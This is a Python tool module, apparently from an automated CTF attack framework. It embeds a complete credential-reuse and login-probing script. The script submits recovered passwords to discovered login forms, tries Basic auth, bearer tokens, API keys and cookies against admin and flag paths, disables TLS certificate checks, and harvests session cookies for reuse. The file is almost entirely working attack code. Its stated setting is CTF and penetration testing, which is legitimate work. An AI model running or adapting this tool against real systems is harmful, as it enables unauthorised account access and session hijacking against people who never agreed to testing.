"""Credential reuse and login probing tool."""

from __future__ import annotations

import json

from nyuctf_mutil_killchain.tools.core import ToolExecutionError, ToolExecutionRequest

TOOL_NAME = "credential_login_probe"

SCRIPT = r"""
import base64
import hashlib
import http.cookiejar
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse

payload = json.loads(sys.argv[1])
asset_id = payload.get("asset_id", "asset")
base_url = payload.get("base_url")
candidate_credentials = payload.get("candidate_credentials") or []
seed_paths = payload.get("seed_paths") or []
timeout_s = int(payload.get("timeout_s", 30))

records = []
notes_list = []
flag_candidates = []
interesting_paths = []
auth_results = []
successful_credential_ids = []
emitted_session_ids = set()

flag_re = re.compile(r"[A-Za-z0-9_]+\{[^{}\n]{4,200}\}")
_FP_PREFIXES = frozenset({
    "html", "body", "div", "span", "input", "button", "textarea",
    "select", "label", "form", "table", "thead", "tbody", "tr", "td", "th",
    "ul", "ol", "li", "nav", "header", "footer", "section", "article",
    "aside", "main", "summary", "details", "dialog", "fieldset", "legend",
    "img", "video", "audio", "canvas", "svg", "path", "circle", "rect",
    "code", "pre", "blockquote", "cite", "abbr", "address", "figure",
    "var", "function", "return", "if", "else", "for", "while", "switch",
    "case", "class", "interface", "struct", "enum", "type", "export",
    "import", "from", "const", "let", "new", "delete", "typeof", "void",
    "null", "undefined", "true", "false", "try", "catch", "throw",
    "this", "self", "super", "def", "lambda", "yield", "async", "await",
    "create", "drop", "alter", "insert", "update",
})
_CSS_BODY = re.compile(
    r"^[\s]*([a-z\-]+\s*:\s*[a-z0-9#%.\"', \-()]+\s*;?[\s]*)+$",
    re.IGNORECASE,
)

def _plausible_flag(m):
    prefix, _, body = m.partition("{")
    body = body.rstrip("}")
    if not prefix or not body:
        return False
    if any(ord(c) < 32 or ord(c) == 127 for c in body):
        return False
    if prefix.lower() in _FP_PREFIXES:
        return False
    if _CSS_BODY.match(body):
        return False
    return True

title_re = re.compile(r"<title[^>]*>(.*?)</title>", re.IGNORECASE | re.DOTALL)


class LoginFormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self.current_form = {
                "action": attrs.get("action") or "",
                "method": (attrs.get("method") or "post").lower(),
                "inputs": [],
            }
        elif tag in {"input", "button"} and self.current_form is not None:
            name = attrs.get("name") or attrs.get("id") or ""
            input_type = (attrs.get("type") or "text").lower()
            value = attrs.get("value") or ""
            if name:
                self.current_form["inputs"].append(
                    {"name": name, "type": input_type, "value": value}
                )

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None


def add_flag_candidates(text):
    for candidate in flag_re.findall(text or ""):
        if not _plausible_flag(candidate):
            continue
        if candidate not in flag_candidates:
            flag_candidates.append(candidate)


def add_interesting_path(url):
    if url and url not in interesting_paths:
        interesting_paths.append(url)


def title_from_body(body):
    match = title_re.search(body or "")
    if not match:
        return None
    return " ".join(match.group(1).split())[:120]


def build_ssl_context(url):
    parsed = urlparse(url)
    if parsed.scheme != "https":
        return None
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def normalize_paths():
    common_login = [
        "/login", "/signin", "/sign-in", "/admin/login", "/user/login",
        "/auth/login", "/api/login", "/session", "/sessions",
    ]
    common_privileged = [
        "/admin", "/dashboard", "/flag", "/flags", "/debug", "/debug/flag",
        "/api/flag", "/api/admin", "/home", "/profile",
    ]
    login_urls = []
    privileged_urls = []
    for raw in [base_url, *seed_paths, *common_login]:
        text = str(raw).strip()
        if not text:
            continue
        if text.startswith(("http://", "https://")):
            candidate = text
        else:
            candidate = urljoin(base_url.rstrip("/") + "/", text.lstrip("/"))
        if candidate not in login_urls:
            login_urls.append(candidate)
    for raw in [*seed_paths, *common_privileged]:
        text = str(raw).strip()
        if not text:
            continue
        if text.startswith(("http://", "https://")):
            candidate = text
        else:
            candidate = urljoin(base_url.rstrip("/") + "/", text.lstrip("/"))
        if candidate not in privileged_urls:
            privileged_urls.append(candidate)
    return login_urls[:10], privileged_urls[:12]


def fetch(opener, url, *, method="GET", data=None, headers=None):
    req = urllib.request.Request(
        url,
        data=data,
        method=method,
        headers={"User-Agent": "Mozilla/5.0 (autopentest-scanner/0.1)", **(headers or {})},
    )
    try:
        with opener.open(req, timeout=min(timeout_s, 8)) as resp:
            body = resp.read(12000).decode("utf-8", errors="ignore")
            return {
                "status": resp.status,
                "url": resp.geturl(),
                "body": body,
                "headers": dict(resp.headers),
            }
    except urllib.error.HTTPError as exc:
        body = ""
        try:
            body = exc.read(12000).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return {
            "status": exc.code,
            "url": url,
            "body": body,
            "headers": dict(exc.headers) if exc.headers else {},
        }
    except Exception as exc:
        notes_list.append(f"HTTP request failed for {url}: {type(exc).__name__}: {exc}")
        return {
            "status": None,
            "url": url,
            "body": "",
            "headers": {},
        }


def build_form_submission(login_url, body, username, password):
    parser = LoginFormParser()
    try:
        parser.feed(body or "")
    except Exception:
        parser = None
    form = parser.forms[0] if parser and parser.forms else None
    if form is None:
        return login_url, urllib.parse.urlencode({"username": username, "password": password}).encode("utf-8")

    target_url = urljoin(login_url, form.get("action") or "")
    form_data = {}
    username_field = None
    password_field = None
    for field in form.get("inputs", []):
        field_name = field.get("name") or ""
        lowered = field_name.lower()
        if password_field is None and ("pass" in lowered or lowered in {"pwd"}):
            password_field = field_name
        elif username_field is None and any(token in lowered for token in ("user", "login", "email")):
            username_field = field_name
        elif field_name and field.get("type") in {"hidden", "submit"}:
            form_data[field_name] = field.get("value") or ""

    form_data[username_field or "username"] = username
    form_data[password_field or "password"] = password
    return target_url, urllib.parse.urlencode(form_data).encode("utf-8")


def emit_session_credentials(jar, source_credential_id):
    for cookie in list(jar):
        if not cookie.name or not cookie.value:
            continue
        raw_value = f"{cookie.name}={cookie.value}"
        fingerprint = hashlib.sha1(f"{asset_id}:{source_credential_id}:{raw_value}".encode("utf-8")).hexdigest()[:12]
        credential_id = f"credential-session-{fingerprint}"
        if credential_id in emitted_session_ids:
            continue
        emitted_session_ids.add(credential_id)
        records.append({
            "type": "credential",
            "credential_id": credential_id,
            "username": cookie.name,
            "secret_ref": f"session:{asset_id}:{cookie.name}",
            "credential_type": "cookie",
            "asset_ref": asset_id,
            "source": "credential_login_probe",
            "metadata": {
                "secret_value": raw_value,
                "source_credential_id": source_credential_id,
                "cookie_domain": cookie.domain,
                "cookie_path": cookie.path,
            },
        })


def inspect_response(credential_id, mode, response):
    body = response.get("body") or ""
    add_flag_candidates(body)
    url = response.get("url")
    status = response.get("status")
    if status in {200, 201, 202, 204, 302, 303, 307, 401, 403}:
        add_interesting_path(url)
    auth_results.append(
        {
            "credential_id": credential_id,
            "mode": mode,
            "status": status,
            "url": url,
            "title": title_from_body(body),
            "body_preview": body[:240],
        }
    )


if not base_url:
    records.append({"type": "summary", "text": "Credential probe skipped: base_url not provided."})
else:
    login_urls, privileged_urls = normalize_paths()
    ctx = build_ssl_context(base_url)
    base_handlers = []
    if ctx is not None:
        https_handler = urllib.request.HTTPSHandler(context=ctx)
        base_handlers.append(https_handler)

    for candidate in candidate_credentials[:6]:
        credential_id = str(candidate.get("credential_id") or "")
        username = str(candidate.get("username") or "")
        credential_type = str(candidate.get("credential_type") or "unknown").lower()
        metadata = candidate.get("metadata") or {}
        secret_value = str(candidate.get("secret_value") or metadata.get("secret_value") or "")
        if not credential_id or not secret_value:
            continue

        if credential_type == "password" and username:
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(jar),
                *base_handlers,
            )
            login_success = False
            for login_url in login_urls:
                landing = fetch(opener, login_url)
                target_url, form_body = build_form_submission(login_url, landing.get("body", ""), username, secret_value)
                response = fetch(
                    opener,
                    target_url,
                    method="POST",
                    data=form_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                inspect_response(credential_id, "password_form", response)
                response_body = (response.get("body") or "").lower()
                response_url = (response.get("url") or "").lower()
                if (
                    response.get("status") in {200, 302, 303}
                    and ("logout" in response_body or "dashboard" in response_body or "admin" in response_body or "flag" in response_body
                         or "login" not in response_url)
                ):
                    login_success = True
                    if credential_id not in successful_credential_ids:
                        successful_credential_ids.append(credential_id)
                    emit_session_credentials(jar, credential_id)
                    break
            for probe_url in privileged_urls:
                response = fetch(opener, probe_url)
                inspect_response(credential_id, "password_session", response)

                basic_headers = {
                    "Authorization": "Basic "
                    + base64.b64encode(f"{username}:{secret_value}".encode("utf-8")).decode("ascii")
                }
                basic_response = fetch(opener, probe_url, headers=basic_headers)
                inspect_response(credential_id, "password_basic", basic_response)
                if basic_response.get("status") in {200, 302, 303} and credential_id not in successful_credential_ids:
                    successful_credential_ids.append(credential_id)
            if login_success:
                records.append({
                    "type": "finding",
                    "finding_id": f"finding-{asset_id}-{credential_id}-login-success",
                    "title": "Recovered credential authenticated against live application",
                    "severity": "high",
                    "description": f"Credential {credential_id} successfully authenticated or unlocked privileged paths on {base_url}.",
                    "asset_refs": [asset_id],
                    "evidence_refs": [base_url],
                    "metadata": {"source": "credential_login_probe", "credential_id": credential_id},
                })

        elif credential_type in {"token", "cookie"}:
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(jar),
                *base_handlers,
            )
            for probe_url in privileged_urls:
                header_sets = []
                if credential_type == "token":
                    header_sets.extend(
                        [
                            {"Authorization": f"Bearer {secret_value}"},
                            {"X-API-Key": secret_value},
                            {"Authorization": secret_value},
                        ]
                    )
                else:
                    cookie_header = secret_value if "=" in secret_value else f"session={secret_value}"
                    header_sets.append({"Cookie": cookie_header})

                for headers in header_sets:
                    response = fetch(opener, probe_url, headers=headers)
                    inspect_response(credential_id, credential_type, response)
                    if response.get("status") in {200, 302, 303} and credential_id not in successful_credential_ids:
                        successful_credential_ids.append(credential_id)

records.append({
    "type": "summary",
    "text": (
        f"Credential probe completed for {base_url or asset_id}: "
        f"{len(successful_credential_ids)} successful credential(s), {len(flag_candidates)} flag candidate(s)."
    ),
})

if successful_credential_ids:
    records.append({
        "type": "finding",
        "finding_id": f"finding-{asset_id}-credential-auth-success",
        "title": "Recovered credentials unlocked live challenge surface",
        "severity": "high",
        "description": f"{len(successful_credential_ids)} credential(s) unlocked reachable application paths on {base_url}.",
        "asset_refs": [asset_id],
        "evidence_refs": interesting_paths[:8],
        "metadata": {
            "source": "credential_login_probe",
            "successful_credential_ids": successful_credential_ids[:8],
        },
    })

if flag_candidates:
    records.append({
        "type": "finding",
        "finding_id": f"finding-{asset_id}-credential-probe-flags",
        "title": "Flag candidate recovered during credential reuse",
        "severity": "high",
        "description": f"Recovered {len(flag_candidates)} flag candidate(s) while reusing challenge credentials.",
        "asset_refs": [asset_id],
        "evidence_refs": flag_candidates[:8],
        "metadata": {"source": "credential_login_probe", "flag_candidates": flag_candidates[:10]},
    })

for note in notes_list:
    records.append({"type": "note", "text": note})

records.append({
    "type": "output_context",
    "base_url": base_url,
    "successful_credential_ids": successful_credential_ids[:8],
    "interesting_paths": interesting_paths[:20],
    "auth_results": auth_results[:40],
    "flag_candidates": flag_candidates[:10],
    "manual_checks": [
        "Inspect successful credential and session reuse paths for privileged-only content.",
        "Reuse any emitted session cookies against additional admin or flag-bearing routes.",
        "Validate all recovered flag candidates before submission.",
    ],
})

for item in records:
    print(json.dumps(item, ensure_ascii=True))
"""


def build_arguments(request: ToolExecutionRequest) -> list[str]:
    payload = {
        "asset_id": request.metadata.get("asset_id"),
        "base_url": request.metadata.get("base_url"),
        "candidate_credentials": request.metadata.get("candidate_credentials", []),
        "seed_paths": request.metadata.get("seed_paths", []),
        "timeout_s": request.timeout_s,
    }
    if not payload["base_url"]:
        raise ToolExecutionError("credential_login_probe requires metadata.base_url")
    return ["-c", SCRIPT, json.dumps(payload)]
